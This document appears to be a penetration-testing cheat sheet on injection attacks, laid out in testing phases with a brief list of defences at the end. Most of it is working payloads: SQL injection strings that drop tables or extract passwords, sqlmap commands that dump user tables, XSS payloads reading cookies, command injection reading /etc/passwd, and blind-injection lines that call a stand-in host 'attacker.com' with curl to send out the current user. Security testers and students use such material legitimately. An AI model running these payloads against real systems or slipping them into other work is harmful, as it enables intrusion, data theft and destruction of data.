- Untrusted data sent to interpreters as part of commands or queries.
- ## How It Works
	- a) SQL Injection
		- `' OR '1'='1` - Authentication bypass
		- `'; DROP TABLE users--` - Destructive
		- `' UNION SELECT password FROM users--` - Data extraction
	- b) Command Injection
		- `; whoami` - Check current user
		- `| ls -la` - List files
		- `&& cat /etc/passwd` - Read sensitive files
	- c) XSS (Cross-Site Scripting)
		- `<script>alert(document.cookie)</script>`
		- `<img src=x onerror=alert(1)>`
- ## Real-World Examples
	- **Sony Pictures (2011)**: SQL injection led to 1M accounts stolen
	- **British Airways (2018)**: XSS-based Magecart attack stole 380,000 payment cards
	- **Heartland Payment Systems**: SQL injection compromised 130M credit cards
	- **Yahoo (2012)**: SQL injection via union-based attack
- ## Phase 1: Input Discovery
	- **Identify Injection Points**
		- URL parameters: `?id=1`, `?search=test`
		- Form fields: login, search, comments
		- HTTP headers: User-Agent, Referer, Cookie
		- JSON/XML body data
		- File upload names
	- **Tools**
		- ```bash
		  # Spider the application
		  gospider -s http://target.com -d 2
		  # Burp Suite for manual discovery
		  ```
- ## Phase 2: SQL Injection Testing
	- **Detection**
		- ```
		  ' " ; -- /* */ OR 1=1
		  ```
	- **Error-Based SQLi**
		- ```
		  ' AND 1=CONVERT(int,(SELECT @@version))--
		  ' AND extractvalue(1,concat(0x7e,version()))--
		  ```
	- **Union-Based SQLi**
		- ```
		  ' UNION SELECT NULL,NULL,NULL--
		  ' UNION SELECT username,password,NULL FROM users--
		  ```
	- **Blind SQLi**
		- ```
		  ' AND 1=1--  (true)
		  ' AND 1=2--  (false)
		  ' AND SLEEP(5)--  (time-based)
		  ```
	- **Automated Tools**
		- ```bash
		  sqlmap -u "http://target.com/page?id=1" --dbs
		  sqlmap -u "http://target.com/page?id=1" --tables -D dbname
		  sqlmap -u "http://target.com/page?id=1" --dump -T users
		  ```
- ## Phase 3: XSS Testing
	- **Reflected XSS**
		- ```html
		  <script>alert(1)</script>
		  <img src=x onerror=alert(1)>
		  <svg onload=alert(1)>
		  javascript:alert(1)
		  ```
	- **Stored XSS**
		- Test in comments, profiles, messages
		- Check if payload persists and executes
	- **DOM-Based XSS**
		- Check URL fragments: `#<script>alert(1)</script>`
		- Analyze JavaScript for `innerHTML`, `document.write`
	- **Filter Bypass**
		- ```html
		  <ScRiPt>alert(1)</ScRiPt>
		  <img src=x onerror="alert(1)">
		  <svg/onload=alert(1)>
		  ```
- ## Phase 4: Command Injection
	- **Detection**
		- ```
		  ; whoami
		  | id
		  && uname -a
		  `id`
		  $(whoami)
		  ```
	- **Blind Command Injection**
		- ```bash
		  ; sleep 10
		  | ping -c 10 attacker.com
		  ; curl http://attacker.com/$(whoami)
		  ```
	- **Common Vulnerable Parameters**
		- File operations, ping/traceroute, DNS lookups
		- PDF generators, image processors
- ## Phase 5: Other Injection Types
	- **LDAP Injection**
		- `*)(uid=*))(|(uid=*`
	- **XPath Injection**
		- `' or '1'='1`
	- **Template Injection (SSTI)**
		- `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`
	- **Header Injection**
		- `\r\nX-Injected: header`
- ## Tools
	- sqlmap - Automated SQL injection
	- XSStrike - XSS detection
	- Commix - Command injection
	- Burp Suite - Manual testing
	- OWASP ZAP - Automated scanning
- ## Defense
	- Parameterized queries / prepared statements
	- Input validation and sanitization
	- Output encoding
	- Use ORM frameworks
	- Principle of least privilege for DB accounts
